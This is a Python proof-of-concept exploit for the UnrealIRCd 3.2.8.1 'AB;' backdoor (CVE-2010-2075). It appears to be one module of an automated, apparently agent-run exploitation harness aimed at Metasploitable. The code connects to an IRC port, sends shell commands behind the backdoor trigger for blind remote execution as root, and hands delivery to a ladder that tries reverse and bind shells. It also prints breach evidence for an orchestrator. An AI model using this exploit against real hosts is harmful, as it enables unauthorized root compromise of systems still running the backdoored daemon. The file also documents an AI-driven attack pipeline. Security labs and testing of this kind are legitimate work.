#!/usr/bin/env python3
"""UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075) — RCE on Metasploitable's IRC port.

UnrealIRCd 3.2.8.1 was distributed for months in 2009-2010 with a backdoor: any
line the daemon reads that begins with the magic bytes ``AB;`` is passed straight
to ``system()`` and executed as the service user (root on Metasploitable 2). It is
blind RCE — the command runs but nothing comes back on the IRC socket. This module
no longer hand-rolls its own bind-shell delivery: it exposes the backdoor as a
single-command injector (``_send_ab``) and hands that to the shared delivery ladder
(``pocs._delivery.establish_rce``), which walks reverse-shell → bind-shell → blind
nonce-callback and confirms the breach with a per-attempt nonce. Only *our* command
echoing the nonce counts, so a patched daemon or a tarpit can never forge success.

Sandbox contract (sandbox/run_sandbox.py) — same two-phase shape as the other PoCs:
  * the target arrives as env var ``TARGET`` (``ip`` or ``ip:port`` for the IRC port);
  * the orchestrator mints the challenge nonce and passes it as ``HALO_NONCE``;
  * TEST phase runs ``--network=none`` with NO ``TARGET`` — so with no target we
    self-check and exit 0 with real stdout, so the harden loop passes us to the
    fire gate rather than discarding a "broken" script;
  * ATTACK phase sets ``TARGET`` and enables the network — we fire for real and
    print the ``HALO-EVIDENCE`` line, which trips agent_loop._SHELL_EVIDENCE.

Only stdlib socket is used (plus the sibling _delivery primitive), so it runs
unchanged in python:3.12-slim.
"""

from __future__ import annotations

import os
import socket
import sys

from pocs._delivery import establish_rce, make_nonce, Breach

MAGIC = b"AB;"                       # the backdoor trigger — the whole vulnerability
DEFAULT_IRC_PORT = 6667


def _send_ab(host: str, irc_port: int, cmd: str, timeout: float = 8.0) -> None:
    """Fire ONE blind command through the ``AB;`` backdoor.

    The delivery ladder calls this with a fully-formed shell one-liner; we frame it
    with the magic prefix and a trailing newline so the daemon reads a complete line
    and hands it to ``system()``. Blind by design — nothing meaningful comes back on
    the IRC socket, the proof arrives out-of-band via the ladder's listener."""
    irc = socket.create_connection((host, irc_port), timeout=timeout)
    try:
        irc.settimeout(timeout)
        try:
            irc.recv(512)                      # NOTICE AUTH banner (ignored)
        except OSError:
            pass
        irc.sendall(MAGIC + cmd.encode() + b"\n")
    finally:
        irc.close()


def exploit(host: str, irc_port: int = DEFAULT_IRC_PORT, *, nonce: str = "") -> Breach:
    """Trigger the AB; backdoor and let the shared ladder confirm the breach.

    Returns a Breach (falsy when unconfirmed); never raises for a non-breach, so a
    patched/absent daemon is reported as a failure, never a false positive."""
    nonce = nonce or make_nonce()
    return establish_rce(lambda c: _send_ab(host, irc_port, c), host,
                         service="unrealircd", nonce=nonce)


def _selfcheck() -> str:
    """Offline validation for the network-less TEST phase: prove the backdoor trigger
    is well-formed without touching a target. Emits no placeholder token, so the
    sandbox never mistakes this for an un-filled template."""
    assert MAGIC == b"AB;", "backdoor trigger changed"
    return ("SELF-CHECK OK: UnrealIRCd 3.2.8.1 backdoor PoC ready — "
            f"trigger={MAGIC.decode()} irc_port={DEFAULT_IRC_PORT} via _delivery ladder")


def _parse_target(target: str) -> tuple[str, int]:
    target = target.strip()
    if ":" in target:
        host, _, port = target.rpartition(":")
        if port.isdigit():
            return host, int(port)
    return target, DEFAULT_IRC_PORT


def run_from_env(env) -> tuple[int, str]:
    """Return (exit_code, stdout_text). Shared by __main__ and the test suite.

    No TARGET  -> TEST phase: self-check, exit 0 with real stdout (hardens clean).
    TARGET set -> ATTACK phase: fire; exit 0 + HALO-EVIDENCE on breach, else 1.
    """
    target = env.get("TARGET", "").strip()
    if not target:
        return 0, _selfcheck()
    host, irc_port = _parse_target(target)
    nonce = env.get("HALO_NONCE", "").strip()
    try:
        br = exploit(host, irc_port=irc_port, nonce=nonce)
    except Exception as e:  # noqa: BLE001 — any failure is a non-breach, report it
        return 1, f"EXPLOIT FAILED: {e}"
    if not br:
        return 1, f"EXPLOIT FAILED: no breach on {host}:{irc_port}"
    return 0, str(br)


if __name__ == "__main__":
    rc, out = run_from_env(os.environ)
    print(out)
    sys.exit(rc)
